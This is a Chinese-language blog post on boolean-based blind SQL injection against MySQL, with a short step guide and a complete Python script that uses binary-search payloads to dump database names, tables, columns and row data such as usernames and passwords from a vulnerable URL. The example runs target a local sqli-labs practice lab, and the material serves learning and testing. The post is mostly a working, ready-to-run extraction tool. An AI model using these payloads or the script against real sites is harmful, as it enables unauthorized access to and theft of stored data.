<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>SQL 注入之布尔型注入(MySQL) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>SQL 注入之布尔型注入(MySQL)</h1>
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2016-06-23</time>
    <span>in</span>
    
      <a href="/categories/Pentest">Pentest</a>
  </strong>
  <span> • 1236 words</span>
  
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/injection">injection</a>
    </div>
  
</div>

      <div>

<h3 id="0x00-特点">0x00 特点</h3>

<pre><code>当页面存在注入，但是没有显示位，且没有用echo &quot;mysql_error()&quot;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
</code></pre>

<h3 id="0x01-利用方式">0x01 利用方式</h3>

<pre><code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
</code></pre>

<h3 id="0x02-注入步骤">0x02 注入步骤</h3>

<ol>
<li><p>找到注入点，判断闭合字符
<img src="/img/post/sqli8_get_closed_character.png" alt="得到闭合字符" /></p></li>

<li><p>尝试猜解列数，得到显示位
<img src="/img/post/sqli8_order_by.png" alt="猜解列数" />
<img src="/img/post/sqli8_display_point.png" alt="尝试得到显示位" /></p></li>

<li><p>得到数据库名
<img src="/img/post/sqli8_get_db_num.png" alt="猜解数据库数量" />
<img src="/img/post/sqli8_get_db_name_char.png" alt="猜第5个数据库第2个字符" />
最终得到第五个数据库名为security</p></li>

<li><p>得到表名
<img src="/img/post/sqli8_get_table_num_name_len.png" alt="猜解表的数量和第4张表的表名长度" />
<img src="/img/post/sqli8_get_table_name_char.png" alt="猜第4个表第1个字符" />
最终依次猜的表名为users</p></li>

<li><p>得到列名
<img src="/img/post/sqli8_get_column_num.png" alt="猜解有几列" />
<img src="/img/post/sqli8_get_column_name_len.png" alt="猜解users表第2列列名的长度" />
<img src="/img/post/sqli8_get_column_name_one_char.png" alt="猜测users表第2列列名的第1个字符" />
同理最终得到第2列列名为username，第3列列名为password</p></li>

<li><p>得到列值
<img src="/img/post/sqli8_get_column_value_num.png" alt="猜解数据条数" />
<img src="/img/post/sqli8_get_column_value_len.png" alt="猜解第13条数据username字段值的长度" />
<img src="/img/post/sqli8_get_column_value_char.png" alt="猜解第13条数据username字段值的前两个字符" />
依次得到为admin4，同理可得其他数据</p></li>
</ol>

<h3 id="0x04-附上python脚本">0x04 附上python脚本</h3>

<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber &lt;1070018473@qq.com&gt;

__author__=&quot;reber&quot;

import sys
import requests
import binascii
import hashlib
from pyfiglet import figlet_format
from optparse import OptionParser


def get_md5_html(url):
    html = requests.get(url=url).content

    m2 = hashlib.md5()
    m2.update(html)
    md5_html = m2.hexdigest()

    return md5_html

def get2(*args): #二分法得到数值
    low,high,url,payload,standard_md5 = args
    while low &lt;= high:
        mid = (low + high)/2;

        mid_url = url + payload.format(mid=mid)
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        num = (low+high+1)/2
    return num

def getAllDatabases(url):
    standard_md5 = get_md5_html(url)
    # print standard_md5

    payload = &quot;' and ((select count(distinct+table_schema) from information_schema.tables) &gt; {mid})--+&quot;
    # payload = payload.replace(' ','%20')
    db_num = get2(1,100,url,payload,standard_md5)

    print &quot;The total number of database is: %d&quot; % db_num
    for index in xrange(0,db_num):  #一次循环输出一个数据库名
        payload = &quot;' and (length((select distinct table_schema from information_schema.tables limit {index},1)) &gt; {mid})--+&quot;.format(index=index,mid='{mid}')
        # payload = payload.replace(' ','%20')

        db_name_len = get2(1,30,url,payload,standard_md5)

        # print &quot;database name length:%d&quot; % db_name_len
        print &quot;[*] &quot;,
        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符            
            payload = &quot;' and (select ascii(substr((select distinct table_schema from information_schema.tables limit {index},1), {x}, 1)) &gt; {mid}) --+&quot;.format(index=index,x=x,mid='{mid}')
            # payload = payload.replace(' ','%20')

            str_ascii = get2(32,126,url,payload,standard_md5)

            database_name_one_str = chr(str_ascii)
            # print database_name_one_str
            sys.stdout.write(database_name_one_str)
            sys.stdout.flush()
        print

def getAllTablesByDb(url,db_name):
    standard_md5 = get_md5_html(url)
    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    payload = &quot;' and ((select count(distinct+table_name) from information_schema.tables where table_schema={db_name_hex}) &gt; {mid})--+&quot;.format(db_name_hex=db_name_hex,mid='{mid}')
    # payload = &quot;/**/&quot;.join(payload.split())
    db_num = get2(1,200,url,payload,standard_md5)

    print &quot;Database %s: [%d tables]&quot; % (db_name,db_num)
    for index in xrange(0,db_num):  #一次循环输出一个表名
        payload = &quot;' and (length((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1)) &gt; {mid})--+&quot;.format(db_name_hex=db_name_hex,index=index,mid='{mid}')
        payload = &quot;/**/&quot;.join(payload.split())
        table_name_len = get2(1,30,url,payload,standard_md5)

        print &quot;[*] &quot;,
        for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
            payload = &quot;' and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema={db_name_hex} limit {index},1), {x}, 1)) &gt; {mid}) --+&quot;.format(db_name_hex=db_name_hex,index=index,x=x,mid='{mid}')
            # payload = &quot;/**/&quot;.join(payload.split())
            str_ascii = get2(32,126,url,payload,standard_md5)

            table_name_one_str = chr(str_ascii)
            sys.stdout.write(table_name_one_str)
            sys.stdout.flush()
        print 

def getAllColumnsByTable(url,table_name,db_name):
    #for循环，一次得到一列的列名：
        #while循环得到列名的长度：
        #for循环，一次得出列名的一个字符
    standard_md5 = get_md5_html(url)
    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    payload = &quot;' and ((select count(distinct+column_name) from information_schema.columns where table_name={table_name_hex} and table_schema={db_name_hex}) &gt; {mid})--+&quot;.format(table_name_hex=table_name_hex,db_name_hex=db_name_hex,mid='{mid}')
    # payload = &quot;/**/&quot;.join(payload.split())
    column_num = get2(1,200,url,payload,standard_md5)

    print &quot;Table %s: [%d columns]&quot; % (table_name,column_num)
    for index in xrange(0,column_num):  #一次循环输出一个列名
        payload = &quot;' and (length((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1)) &gt; {})--+&quot;.format(table_name_hex,db_name_hex,index,'{mid}')
        # payload = &quot;/**/&quot;.join(payload.split())
        column_name_len = get2(1,30,url,payload,standard_md5)

        # print &quot;column length is: %d&quot; % column_name_len
        print &quot;[*] &quot;,
        for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
            payload = &quot;' and (select ascii(substr((select distinct column_name from information_schema.columns where table_name={} and table_schema={} limit {},1), {}, 1)) &gt; {}) --+&quot;.format(table_name_hex,db_name_hex,index,x,'{mid}')
            # payload = &quot;/**/&quot;.join(payload.split())
            str_ascii = get2(32,126,url,payload,standard_md5)

            column_name_one_str = chr(str_ascii)
            sys.stdout.write(column_name_one_str)
            sys.stdout.flush()
        print

def getAllcontent(url,column_name,table_name,db_name):
    #for循环，一次得到一行的值
        #while循环得到每个字段的长度
        #for循环，一次得出一个字段的一个字符
    column_name = column_name.split(',')
    len_column_name = len(column_name)
    # print &quot;len_column_name:%d&quot; % len_column_name
    standard_md5 = get_md5_html(url)
    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    payload = &quot;' and ((select count(*) from {}.{}) &gt; {})--+&quot;.format(db_name,table_name,'{mid}')
    payload = &quot;/**/&quot;.join(payload.split())
    column_value_num = get2(1,10000,url,payload,standard_md5)

    print &quot;The %s table with %d row value: &quot; % (table_name,column_value_num)
    stri = &quot;&quot;
    for x in xrange(0,len_column_name):#输出title
        stri += &quot;%s\t&quot; % column_name[x]
    print stri
    for index in xrange(0,column_value_num):  #一次循环输出一行数据
        for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
            payload = &quot;' and (length((select {} from {}.{} limit {},1)) &gt; {})--+&quot;.format(column_name[y],db_name,table_name,index,'{mid}')
            # payload = &quot;/**/&quot;.join(payload.split())
            column_value_len = get2(1,30,url,payload,standard_md5)

            # print &quot;column value length is: %d&quot; % column_value_len
            for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
                payload = &quot;' and (select ascii(substr((select {} from {}.{} limit {},1), {}, 1)) &gt; {}) --+&quot;.format(column_name[y],db_name,table_name,index,x,'{mid}')
                # payload = &quot;/**/&quot;.join(payload.split())
                str_ascii = get2(32,126,url,payload,standard_md5)

                column_name_one_str = chr(str_ascii)
                sys.stdout.write(column_name_one_str)
                sys.stdout.flush()
            sys.stdout.write(&quot;\t&quot;)
        print


def main():
    print figlet_format(&quot;sql-bool&quot;)
    parser = OptionParser(usage='Usage: python %prog [options]',version='%prog 1.2')
    parser.add_option(&quot;-u&quot;,&quot;--URL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;url&quot;,
              help=&quot;target url&quot;)
    parser.add_option(&quot;-D&quot;,&quot;--DB&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;db_name&quot;,
              help=&quot;get database name&quot;)
    parser.add_option(&quot;-T&quot;,&quot;--TBL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;table_name&quot;,
              help=&quot;get table name&quot;)
    parser.add_option(&quot;-C&quot;,&quot;--COL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;column_name&quot;,
              help=&quot;get column name&quot;)
    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,
              dest=&quot;dbs&quot;,help=&quot;get all database name&quot;)
    (options,args) = parser.parse_args()

    if options == None or options.url == None:
        parser.print_help()
    elif options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.url:
        parser.print_help()


if __name__ == '__main__':
    main()
    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; --dbs
    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security
    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security -T users
    #python test.py -u &quot;http://192.168.188.134/sqli/Less-8/?id=1&quot; -D security -T users -C username,password
</code></pre>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         | 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    using the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
